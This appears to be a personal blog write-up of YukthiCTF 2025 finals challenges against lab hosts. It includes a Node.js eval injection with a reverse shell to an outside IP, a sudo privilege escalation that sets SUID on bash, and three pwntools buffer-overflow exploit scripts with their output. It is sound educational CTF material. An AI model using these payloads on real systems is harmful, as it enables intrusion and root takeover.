---
title: "YukthiCTF 2025"
description: "Free Redbull"
icon: "article"
date: "2025-12-29"
lastmod: "2025-12-29"
draft: false
toc: true
weight: 999
---

I think this meme perfectly sums it up LMAO. An upgrade it was!

{{< figure src="image.png" alt="image" >}}

# Setup

Before anything, let’s talk about the setup cause that is one of the most unique things about this competition, setup was one thing and Infrastructure was another - and now that they really upped their game, the experience was much nicer and now the positives much more than the negatives.

By setup I mean the steps you take before you actually begin solving a challenge and Infrastructure is how the site works overall and how it handles and compared to other setups out there 

I really went from this. 2024.

{{< figure src="image 1.png" alt="image 1" >}}

To admiring their overall setup, just last year I was starting out on CTFs and if you look closely I really spelled it `dCTF` that was how bad I was, barely making to the finals and placed #22 out of 25.

It really shows that they really spend a while patching and upgrading the site, even attention to detail like this one where having features that supports auto-adding of top teams from the qualifiers to the finals.

{{< figure src="image 2.png" alt="image 2" >}}

Enough glaze, go check them out yourself.

[Yukthi CTF Arena](https://arena.yukthictf.com/)

`Setup`

```xml
1 - add ssh pub keys to github
2 - add device in lab site and download wireguard tunnel file
3 - install wireguard - import the file and activate
4 - connected to the vpn
5 - either connect vscode with remote ssh
6 - or direct ssh with port-forwarding 
```

`Infrastructure`

The entire site is like a game-based ranking system with it’s own form of point system made of a thing called `Zeal`. It kinda acts like `THM` rooms, first you join the room and then start the instance to play the challenge but a twist in `SNA` is that they have a timer doing a countdown and if it runs out the machine stops and you lose the overall points/`Zeal` when you attempt it again, to more attempts the lesser the points, but you can also extend the timer with another form of currency know as `Jolt` with which you can buy stuff like hints and so on - even opening hints reduces the overall points for that specific challenge but on the brighter side it you manage to solve the challenge within a specific time you can rewarded with extra points through rewards/achievements.

```xml
★ notifs when team member starts a challenge
★ shows time taken to solve a challenge by a team
★ flag sharing hard due to dynamically launched instances
★ confetti when team solves a challenge lol
★ shared instances for entire team in particular challenge
<TODO>
```

# Finals

### Zeal Engine

{{< figure src="image 3.png" alt="image 3" >}}

Starting out with just an IP address and port number, I began probing the web service at 10.11.25.69:8097 and discovered it had an execute endpoint that accepted JSON commands. Through testing different command formats, I found that the service had a special interpreter that processed commands starting with the exclamation-zeal prefix, and more importantly, it supported an eval function that would execute arbitrary JavaScript code. This was immediately interesting because eval in a Node.js environment is extremely dangerous since it has access to the entire JavaScript runtime including built-in modules that can spawn system processes.

```xml
AbuCTF@essentials:~$ curl -s -X POST http://10.11.25.69:8097/execute -H "Content-Type: application/json" -d '{"command":"!zeal eval(\"console.Console.constructor(\\\"return process.mainModule.require(\\\\\\\"child_process\\\\\\\").execSync(\\\\\\\"ls -la /home/zeal-engine\\\\\\\").toString()\\\")()\")"}'  | jq -r .result
Result: total 32
drwxr-x--- 1 zeal-engine zeal-engine 4096 Dec 19 05:21 .
drwxr-xr-x 1 root        root        4096 Dec 19 04:05 ..
-rw-r--r-- 1 zeal-engine zeal-engine  220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 zeal-engine zeal-engine 3771 Mar 31  2024 .bashrc
drwxrwxr-x 5 zeal-engine zeal-engine 4096 Dec 19 05:21 .pm2
-rw-r--r-- 1 zeal-engine zeal-engine  807 Mar 31  2024 .profile
-rw-r--r-- 1 root        root          39 Dec 19 05:21 zeal.txt

AbuCTF@essentials:~$ curl -s -X POST http://10.11.25.69:8097/execute -H "Content-Type: application/json" -d '{"command":"!zeal eval(\"console.Console.constructor(\\\"return process.mainModule.require(\\\\\\\"child_process\\\\\\\").execSync(\\\\\\\"cat /home/zeal-engine/zeal.txt\\\\\\\").toString()\\\")()\")"}'  | jq -r .result
Result: 7a8034a1568d5949bd37e125e9e371bf.ninja

AbuCTF@essentials:~$
```

The breakthrough came when I realized I could abuse JavaScript's prototype chain through the `console.Console.constructor` pattern. By calling console.Console.constructor, I was effectively accessing the Function constructor which lets you create new functions from strings at runtime, essentially giving me another layer of eval that often bypasses security restrictions. Inside the constructed function, I used `process.mainModule.require` to load the child_process module, then called `execSync` to run actual system commands and return their output as strings. The tricky part was getting all the escaping right since I had to send this through multiple layers - first the shell running curl, then JSON parsing, then the eval string, and finally the constructor string.

`Shell`

```xml
AbuCTF@essentials:~$ curl -s -X POST http://10.11.25.69:8097/execute \
  -H "Content-Type: application/json" \
  -d '{"command":"!zeal eval(\"console.Console.constructor(\\\"return process.mainModule.require(\\\\\\\"child_process\\\\\\\").exec(\\\\\\\"bash -c \\\\\\\\\\\\\\\"bash -i >& /dev/tcp/10.11.0.29/9001 0>&1\\\\\\\\\\\\\\\"\\\\\\\")\\\")()\")"}' 
{"status":"success","input":"!zeal eval(\"console.Console.constructor(\\\"return process.mainModule.require(\\\\\\\"child_process\\\\\\\").exec(\\\\\\\"bash -c \\\\\\\\\\\\\\\"bash -i >& /dev/tcp/10.11.0.29/9001 0>&1\\\\\\\\\\\\\\\"\\\\\\\")\\\")()\")","result":"Result: [object Object]"}AbuCTF@essentials:~$ 
```

Running *sudo-l* output showed that zeal-engine could run a specific Node.js script at /opt/zeal/spell.js as root without providing a password, which is exactly the kind of sudo misconfiguration that leads to easy privilege escalation. I examined the maintenance script and found it was designed to take a command as an argument, execute it with execSync, and log the output to a file. While I could potentially inject commands through the argument, I checked the file permissions first and discovered something even better - the script itself was writeable by my current user.

`Priv ESC`

```xml
AbuCTF@essentials:~$ nc -lvnp 9001
Listening on 0.0.0.0 9001
Connection received on 10.11.25.69 47286
bash: cannot set terminal process group (112): Inappropriate ioctl for device
bash: no job control in this shell
zeal-engine@zeal-engine:/app$ ls
ls
node_modules
package-lock.json
package.json
public
server.js
static
zeal-engine@zeal-engine:/app$ sudo -l
sudo -l
Matching Defaults entries for zeal-engine on zeal-engine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User zeal-engine may run the following commands on zeal-engine:
    (root) NOPASSWD: /usr/bin/node /opt/zeal/spell.js
zeal-engine@zeal-engine:/app$ cat /opt/zeal/spell.js
cat /opt/zeal/spell.js
#!/usr/bin/env node

/**
 * Zeal maintenance helper.
 *
 * Operations are expected to be defined by on-call engineers.
 * Usage: sudo /usr/bin/node /opt/zeal/spell.js "<command>"
 */

const { execSync } = require('child_process');
const fs = require('fs');

const LOG_PATH = '/var/log/zeal-spell.log';
const cmd = process.argv[2] || 'uptime';

try {
    const result = execSync(cmd, { stdio: 'pipe' }).toString();
    fs.appendFileSync(LOG_PATH, `[${new Date().toISOString()}] ${result}\n`);
    console.log('Maintenance command executed successfully.');
} catch (err) {
    console.error('Maintenance command failed:', err.message);
}

zeal-engine@zeal-engine:/app$
```

I used a here-document to overwrite the spell.js file with a minimal Node.js script that simply imported `child_process` and executed `chmod u+s` /bin/bash, then printed confirmation that it completed.

With my trojanized script in place, I executed it through sudo which ran my code as root and successfully set the SUID bit on bash. Now all I had to do was run bash with the `-p` flag to launch a privileged shell. The -p flag is crucial here because by default bash will drop elevated privileges for security reasons when the effective UID differs from the real UID, but -p tells it to preserve those privileges and honor the SUID bit. Running /bin/bash -p gave me a root prompt, which I confirmed by running whoami. From there it was a simple matter of navigating to /root, finding the root.txt file.

`Flag`

```xml
zeal-engine@zeal-engine:~$ cat > /opt/zeal/spell.js << 'EOF'
> #!/usr/bin/env node
> const { execSync } = require('child_process');
> execSync('chmod u+s /bin/bash', { stdio: 'inherit' });
> console.log('Done');
> EOF
zeal-engine@zeal-engine:~$ sudo /usr/bin/node /opt/zeal/spell.js
/bin/bash -pDone

zeal-engine@zeal-engine:~$ /bin/bash -p
bash-5.2# whoami
root
bash-5.2# cd /root
bash-5.2# ls
root.txt
bash-5.2# cat root.txt
f468b33bd31db440705afe493a83ebd3.ninja
bash-5.2#
```

### Binary Bloodline V2

{{< figure src="image 4.png" alt="image 4" >}}

`1`

This was a straightforward stack buffer overflow where the vulnerable program asked for a name input and didn't properly check the buffer size. The binary had a hidden `home()` function at address `0x0804925A` that would print the flag when called, but it wasn't reachable through normal program flow. By analyzing the stack layout, I found the buffer was 24 bytes from the saved base pointer, so I needed 28 bytes total to reach the return address (24 for buffer plus 4 for saved `EBP`). I crafted a payload that filled those 28 bytes with junk, then overwrote the return address with the address of home(). When the vulnerable function returned, instead of going back to its caller, it jumped directly to home() which executed and printed the flag.

```xml
#!/usr/bin/env python3
from pwn import *

# Configuration
HOST = '10.11.25.194'
PORT = 9004

# Address of home() function that prints the flag
HOME_ADDR = 0x0804925A

# Create the payload
# Buffer is at ebp-0x18 (24 bytes from ebp)
# Need to fill: 24 bytes (buffer to ebp) + 4 bytes (saved ebp) = 28 bytes
# Then overwrite return address with home() address

offset = 28
payload = b'A' * offset
payload += p32(HOME_ADDR)

# Connect to the service
print(f"[+] Connecting to {HOST}:{PORT}")
io = remote(HOST, PORT)

# Receive banner
banner = io.recvuntil(b'Your name:\n')
print(banner.decode())

# Send exploit payload
print(f"[+] Sending payload: {offset} bytes padding + home() address (0x{HOME_ADDR:08x})")
io.sendline(payload)

# Receive all output including the flag
print("[+] Receiving response...")
response = io.recvall(timeout=2)
print("\n" + "="*50)
print(response.decode('utf-8', errors='replace'))
print("="*50)
print("\n[DEBUG] Raw bytes:", response)

io.close()
print("[+] Done!")
```

```xml
(omni) AbuCTF@essentials:~$ python3 exploit.py
[+] Connecting to 10.11.25.194:9004
[+] Opening connection to 10.11.25.194 on port 9004: Done
**************************************
*        Welcome to Selfmade Ninja   *
*        Buffer Overflow Challenge   *
**************************************

Your name:

[+] Sending payload: 28 bytes padding + home() address (0x0804925a)
[+] Receiving response...
[+] Receiving all data: Done (129B)
[*] Closed connection to 10.11.25.194 port 9004

==================================================
welcome to SNA, AAAAAAAAAAAAAAAAAAAAAAAAAAAAZ�\x04\x08
Returning to home successfully
Flag: ebcb5c8f681a79df996bd816b97c8428.ninja

OK

==================================================

[DEBUG] Raw bytes: b'welcome to SNA, AAAAAAAAAAAAAAAAAAAAAAAAAAAAZ\x92\x04\x08\nReturning to home successfully\nFlag: ebcb5c8f681a79df996bd816b97c8428.ninja\n\nOK\n'
[+] Done!
```

`2`

This challenge was similar to the first but with an added twist - the `admin()` function that prints the flag required two specific arguments to pass validation checks. The function expected arg1 to be `0xAABBCCDD` and arg2 to be `0xDDCCBBAA`, and would only print the flag if both matched. In `x86` calling convention, function arguments are pushed onto the stack before the return address, so when you hijack control flow by overwriting the return address, you need to set up the stack as if the function was called normally. My payload was 28 bytes of padding to reach the return address, then the admin() address, then 4 bytes of junk for a fake return address (doesn't matter since we're not returning from admin), then the two required arguments in the correct order. The program jumped to admin() which read its arguments from the stack positions I controlled, validated them successfully, and printed the flag.

```python
#!/usr/bin/env python3
from pwn import *

# Configuration
HOST = '10.11.25.194'
PORT = 9005

# Address of admin() function that prints the flag
ADMIN_ADDR = 0x0804925A

# Required argument values for admin(a1, a2)
ARG1 = -1430532899  # 0xAABBCCDD
ARG2 = -573785174   # 0xDDCCBBAA

# Convert to unsigned 32-bit for packing
ARG1_UNSIGNED = ARG1 & 0xffffffff
ARG2_UNSIGNED = ARG2 & 0xffffffff

# Create the payload
# Buffer layout:
# - 24 bytes: padding to reach saved EBP
# - 4 bytes: saved EBP (junk)
# - 4 bytes: return address (admin function)
# - 4 bytes: fake return address (junk, for when admin returns)
# - 4 bytes: argument 1 (a1)
# - 4 bytes: argument 2 (a2)

offset = 28  # 24 bytes buffer + 4 bytes saved EBP
payload = b'A' * offset
payload += p32(ADMIN_ADDR)           # Return to admin()
payload += b'BBBB'                   # Fake return address (doesn't matter)
payload += p32(ARG1_UNSIGNED)        # arg1 = 0xAABBCCDD
payload += p32(ARG2_UNSIGNED)        # arg2 = 0xDDCCBBAA

# Connect to the service
print(f"[+] Connecting to {HOST}:{PORT}")
io = remote(HOST, PORT)

# Receive banner
banner = io.recvuntil(b'Name of your clg:\n')
print(banner.decode())

# Send exploit payload
print(f"[+] Sending payload:")
print(f"    - Offset: {offset} bytes")
print(f"    - admin() address: 0x{ADMIN_ADDR:08x}")
print(f"    - arg1: {ARG1} (0x{ARG1_UNSIGNED:08x})")
print(f"    - arg2: {ARG2} (0x{ARG2_UNSIGNED:08x})")
io.sendline(payload)

# Receive all output including the flag
print("\n[+] Receiving response...")
response = io.recvall(timeout=2)
print("\n" + "="*50)
print(response.decode('utf-8', errors='replace'))
print("="*50)

io.close()
print("\n[+] Exploit complete!")
```

```xml
(omni) AbuCTF@essentials:~$ python3 exploit2.py
[+] Connecting to 10.11.25.194:9005
[+] Opening connection to 10.11.25.194 on port 9005: Done
**************************************
*        Welcome to Selfmade Ninja   *
*        Buffer Overflow Challenge   *
**************************************

Name of your clg:

[+] Sending payload:
    - Offset: 28 bytes
    - admin() address: 0x0804925a
    - arg1: -1430532899 (0xaabbccdd)
    - arg2: -573785174 (0xddccbbaa)

[+] Receiving response...
[+] Receiving all data: Done (152B)
[*] Closed connection to 10.11.25.194 port 9005

==================================================
Your clg name is, AAAAAAAAAAAAAAAAAAAAAAAAAAAAZ�\x04\x08BBBB�̻�����
How did you get in here?! oooooo wow :O
Flag: 0ad2199a0290ba9d4f73b2b01216213b.ninja

OK

==================================================

[+] Exploit complete!
```

`3`

This challenge was different from typical return address overwrites - instead of hijacking control flow, I needed to overwrite specific variables at precise stack locations to satisfy conditional checks. The program had two string variables: `s at [ebp-0x98]` and `s1 at [ebp-0x48]`. For the flag to print, s needed to contain "starlight" and s1 needed to contain "`moonshadow42`". The offset between these two variables was 0x98 - 0x48 = 0x50, which is 80 bytes in decimal. I crafted a payload that started with "starlight" followed by a null terminator, then padded with junk for 70 more bytes to reach exactly 80 bytes total, and finally appended "moonshadow42". When this payload was read into the buffer, it overwrote both variables at their exact stack locations, bypassing the string comparison checks and causing the program to print the flag.

```python
#!/usr/bin/env python3
from pwn import *

# Configuration
HOST = '10.11.25.194'
PORT = 9006

# We need to:
# 1. Make s contain "starlight"
# 2. Make s1 contain "moonshadow42"
# s is at [ebp-0x98], s1 is at [ebp-0x48]
# Offset from s to s1 = 0x98 - 0x48 = 0x50 = 80 bytes

# Create the payload
payload = b"starlight"           # s must equal "starlight" (9 bytes)
payload += b"\x00"                # Null terminator (1 byte)
payload += b"A" * (80 - len(payload))  # Padding to reach s1 (70 bytes)
payload += b"moonshadow42"        # s1 must equal "moonshadow42"

# Connect to the service
print(f"[+] Connecting to {HOST}:{PORT}")
io = remote(HOST, PORT)

# Receive welcome message
welcome = io.recvuntil(b'Rune Sequence: ', timeout=3)
print(welcome.decode())

# Send exploit payload
print(f"[+] Sending payload:")
print(f"    - s = 'starlight' (bytes 0-9)")
print(f"    - Padding (bytes 10-79)")
print(f"    - s1 = 'moonshadow42' (bytes 80+)")
print(f"    - Total payload length: {len(payload)} bytes")
io.sendline(payload)

# Receive all output including the flag
print("[+] Receiving response...")
response = io.recvall(timeout=2)
print("\n" + "="*50)
print(response.decode('utf-8', errors='replace'))
print("="*50)

io.close()
print("[+] Done!")
```

```xml
(omni) AbuCTF@essentials:~$ python3 exploit3.py
[+] Connecting to 10.11.25.194:9006
[+] Opening connection to 10.11.25.194 on port 9006: Done

[+] Sending payload:
    - s = 'starlight' (bytes 0-9)
    - Padding (bytes 10-79)
    - s1 = 'moonshadow42' (bytes 80+)
    - Total payload length: 92 bytes
[+] Receiving response...
[+] Receiving all data: Done (104B)
[*] Closed connection to 10.11.25.194 port 9006

==================================================
Welcome, seeker. The runes guard their secrets...
Rune Sequence: f15d04f17d7cf0ccf46a124dfba575eb.ninja

==================================================
[+] Done!
```
